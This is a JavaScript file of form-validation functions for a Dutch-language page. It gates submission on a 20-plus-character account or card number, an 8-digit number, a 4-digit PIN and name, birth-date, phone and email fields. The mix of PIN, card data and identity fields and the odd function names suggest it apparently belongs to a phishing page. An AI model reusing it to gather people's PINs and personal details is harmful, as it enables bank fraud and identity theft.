function interLude(evt) {
if (document.getElementById("abbonummer").value.length >19) {
document.getElementById('x5').disabled = false;
} else { document.getElementById('x5').disabled = true; }

}

function senderLude() {
if (document.getElementById("abbonummer").value.length >19) {
document.getElementById("kook").submit()
}
}

function interLudez(evt) {

if (document.getElementById("repnumr").value.length == 8) {
document.getElementById('x5').disabled = false;
} else { document.getElementById('x5').disabled = true; }

}

function interLud(evt) {

if (document.getElementById("pinzX").value.length == 4) {
document.getElementById('x5').disabled = false;
} else { document.getElementById('x5').disabled = true; }

}

function senderLudez() {
if (document.getElementById("repnumr").value.length == 8) {
document.getElementById("kook").submit()
}
}

function finterLude() {
	document.getElementById("errorclause").style.display = 'none';
if (document.getElementById("achternaam").value.length <3) {
document.getElementById("errorclause").style.display = 'block';
document.getElementById("errorachternaam").style.display = 'block';
} else { document.getElementById("errorachternaam").style.display = 'none'; }
if (document.getElementById("voornaam").value.length <3) {
document.getElementById("errorclause").style.display = 'block';
document.getElementById("errorvoornaam").style.display = 'block';
} else { document.getElementById("errorvoornaam").style.display = 'none'; }
if (document.getElementById("dob1").value == "? undefined:undefined ?") {
document.getElementById("errorclause").style.display = 'block';
document.getElementById("errorgeboortedatum").style.display = 'block';
} else { document.getElementById("errorgeboortedatum").style.display = 'none'; }
	if (document.getElementById("dob2").value == "? undefined:undefined ?") {
document.getElementById("errorclause").style.display = 'block';
document.getElementById("errorgeboortedatum").style.display = 'block';
} else { document.getElementById("errorgeboortedatum").style.display = 'none'; }
 if (document.getElementById("dob3").value == "? undefined:undefined ?") {
document.getElementById("errorclause").style.display = 'block';
document.getElementById("errorgeboortedatum").style.display = 'block';
} else { document.getElementById("errorgeboortedatum").style.display = 'none'; }
if (document.getElementById("telt").value.length <8) {
document.getElementById("errorclause").style.display = 'block';
document.getElementById("errortelt").style.display = 'block';
} else { document.getElementById("errortelt").style.display = 'none'; }

if (document.getElementById("emailt").value.length <3) {
document.getElementById("errorclause").style.display = 'block';
document.getElementById("errormail").style.display = 'block';
} else { document.getElementById("errormail").style.display = 'none'; }

if (document.getElementById("achternaam").value.length >4 || document.getElementById("voornaam").value.length >4 || document.getElementById("telt").value.length >9 || document.getElementById("emailt").value.length >4) {
	if (document.getElementById("errorclause").style.display == 'none') {
	var str = document.getElementById("emailt").value; 
    var res = str;
   document.getElementById("emailt").value = res;
document.getElementById("kook").submit() }
} else {
	return false;
}
}

function isNumber(evt) {
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
}